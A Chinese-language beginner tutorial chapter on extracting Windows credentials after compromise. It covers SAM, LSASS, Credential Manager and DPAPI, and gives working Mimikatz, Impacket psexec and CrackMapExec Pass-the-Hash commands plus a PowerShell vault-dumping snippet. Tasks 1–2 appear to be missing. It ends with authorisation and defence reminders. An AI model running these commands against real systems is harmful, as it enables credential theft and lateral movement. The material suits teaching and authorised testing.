# Windows凭证凭据 - 新手章节指南

## 这个目录是干什么的？

凭证提取是后渗透的核心技能。获取了凭证，你就能以其他用户的身份访问更多系统。这个目录教你如何从 Windows 系统中提取各种凭证。

---

## 为什么要学这个？

```
凭证的价值：
├── 密码 = 访问其他系统的钥匙
├── 哈希 = 可以用于 Pass-the-Hash
├── Kerberos 票据 = 可以冒充用户
└── 凭证是横向移动的基础

现实场景：
├── 你获得了一台机器的访问权限
├── 提取该机器上的凭证
├── 用这些凭证访问其他机器
├── 逐步扩大控制范围
└── 最终获得域管理员权限
```

## 通俗理解核心概念

### Windows 凭证存储位置

```
1. SAM 数据库
├── 存储本地用户的密码哈希
├── 位置：C:\Windows\System32\config\SAM
├── 需要 SYSTEM 权限才能读取
└── 包含 NTLM 哈希

2. LSASS 进程
├── Local Security Authority Subsystem Service
├── 内存中存储登录用户的凭证
├── 包含明文密码（某些情况）
├── 包含 NTLM 哈希
└── 包含 Kerberos 票据

3. 凭证管理器
├── 存储用户保存的密码
├── 比如"记住密码"的网站
├── RDP 连接的凭证
└── 可以被提取

4. DPAPI
├── Data Protection API
├── 用于加密敏感数据
├── 浏览器密码、WiFi 密码等
└── 可以被解密
```

### Mimikatz - 凭证提取神器

```
Mimikatz 是什么？
├── 最著名的凭证提取工具
├── 可以从 LSASS 提取凭证
├── 可以进行 Pass-the-Hash
├── 可以操作 Kerberos 票据
└── 渗透测试必备工具

常用命令：
├── sekurlsa::logonpasswords - 提取登录凭证
├── lsadump::sam - 提取 SAM 数据库
├── lsadump::dcsync - 从 DC 同步凭证
├── kerberos::list - 列出 Kerberos 票据
└── kerberos::ptt - 注入票据
```

### Pass-the-Hash (PtH)

```
什么是 Pass-the-Hash？
├── 不需要知道明文密码
├── 只需要密码的哈希值
├── 用哈希直接认证
└── Windows 认证的"漏洞"

原理：
├── Windows NTLM 认证使用哈希
├── 服务器不验证你是否知道明文
├── 只验证你是否有正确的哈希
└── 所以有哈希就能登录

类比：
├── 正常登录 = 用钥匙开门
├── Pass-the-Hash = 用钥匙的模具开门
└── 门锁不在乎你用的是原版还是复制品
```

# 以管理员身份运行 Mimikatz

### 任务3：Pass-the-Hash 实践

```
# 使用 Mimikatz 进行 PtH
sekurlsa::pth /user:Administrator /domain:WORKSTATION /ntlm:32ed87bdb5fdc5e9cba88547376818d4

# 或使用 Impacket
python psexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 Administrator@target_ip

# 或使用 CrackMapExec
crackmapexec smb target_ip -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

### 任务4：提取凭证管理器中的密码

```
# 使用 Mimikatz
vault::cred
vault::list

# 或使用 PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
```

## 凭证类型速查

```
┌─────────────────────────────────────────────────────┐
│ NTLM 哈希                                            │
│ 格式: 32位十六进制字符串                              │
│ 用途: Pass-the-Hash, 破解                            │
│ 示例: 32ed87bdb5fdc5e9cba88547376818d4              │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ Kerberos 票据                                        │
│ 格式: Base64 编码的二进制数据                        │
│ 用途: Pass-the-Ticket, 冒充用户                      │
│ 类型: TGT (Ticket Granting Ticket)                  │
│       TGS (Ticket Granting Service)                 │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ 明文密码                                             │
│ 来源: WDigest (旧系统), 凭证管理器                   │
│ 用途: 直接登录, 尝试密码重用                         │
└─────────────────────────────────────────────────────┘
```

## 安全提醒

```
重要提醒：
├── 凭证提取需要管理员权限
├── Mimikatz 会被杀软检测
├── 需要配合绕过技术使用
└── 只在授权测试中使用

防御建议：
├── 启用 Credential Guard
├── 禁用 WDigest
├── 使用 LAPS 管理本地管理员密码
├── 监控 LSASS 访问
└── 部署 EDR 解决方案
```
